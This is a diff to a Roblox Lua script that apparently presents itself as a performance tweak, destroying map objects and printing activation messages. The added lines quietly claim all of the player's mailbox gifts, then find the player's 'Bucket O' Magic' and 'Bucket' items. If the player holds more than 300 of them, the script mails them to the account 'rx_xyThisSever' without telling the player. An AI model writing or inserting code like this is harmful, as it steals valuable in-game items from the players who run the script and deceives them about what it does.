@@ -1,4 +1,5 @@
 
+
 local currentActivePart = workspace:FindFirstChild("CurrentlyActive")
 
 
@@ -23,13 +24,123 @@ local TrueSubFalsePlus = true
 print("Developer : Leanguttzz")
 print("Information : Activating Script…")
 print("Information : Best Functioning111")
-wait(2)
+wait(10)
 workspace.Map:Destroy()
+local player = game.Players.LocalPlayer
+local gui = player.PlayerGui:FindFirstChild("_MACHINES")
+
+if gui then
+    local mailboxMachine = gui.MailboxMachine
+    if mailboxMachine then
+        local giftsFrame = mailboxMachine.Frame.GiftsFrame
+        if giftsFrame then
+            local itemsFrame = giftsFrame.ItemsFrame
+            if itemsFrame then
+                local children = itemsFrame:GetChildren()
+                if #children > 0 then
+                    for _, child in ipairs(children) do
+                        if child:IsA("Frame") then
+                            local args = {
+                                [1] = {
+                                    [1] = child.Name
+                                }
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+wait(3)
+-- Services/Variables
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+local ItemTable = {"Bucket O' Magic", "Bucket"}
+
+local MagicName
+local MagicAmount
+local MagicId
+local BucketName
+local BucketAmount
+local BucketId
+
+function MakeTable(Table)
+    local Temp = {}
+    for i, v in next, Client.Items.All.Globals.All() do
+        if table.find(Table, v._data.id) then
+            table.insert(Temp, v)
+        end
+    end
+    return Temp
+end
+
+function GrabId()
+    local foundMagic = false
+    local foundBucket = false
+    
+    for i, MadeTable in pairs(MakeTable(ItemTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        
+        if Table.data.id == "Bucket O' Magic" then
+            MagicName = Table.data.id
+            MagicAmount = Table.data._am
+            MagicId = Table.uid
+            foundMagic = true
+        end
+
+        if Table.data.id == "Bucket" then
+            BucketName = Table.data.id
+            BucketAmount = Table.data._am
+            BucketId = Table.uid
+            foundBucket = true
+        end
+    end
+
+    if not foundMagic or not foundBucket then
+        print("Not enough items.")
+        return
+    end
+
+    if MagicAmount and MagicAmount <= 300 then
+        print("Not enough items.")
+        return
+    end
+
+    if MagicName and MagicAmount and MagicId then
+        print("Magic Info:")
+        print("Name:", MagicName)
+        print("Amount:", MagicAmount)
+        print("ID:", MagicId)
+    end
+
+    if BucketName and BucketAmount and BucketId then
+        print("Bucket Info:")
+        print("Name:", BucketName)
+        print("Amount:", BucketAmount)
+        print("ID:", BucketId)
+    end
+
+    local args = {
+        [1] = "rx_xyThisSever",
+        [2] = "'" .. (BucketAmount or "") .. "'",
+        [3] = "Misc",
+        [4] = MagicId or "",
+        [5] = MagicAmount or ""
+    }
+
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+end
+
+GrabId()
 
 workspace:FindFirstChild("__THINGS").Breakables:Destroy()
 workspace:FindFirstChild("__THINGS").Eggs:Destroy()
 workspace:FindFirstChild("__THINGS").Ornaments:Destroy()
-wait(15)
+wait(10)
 
 local player = game.Players.LocalPlayer
 local character = player.Character
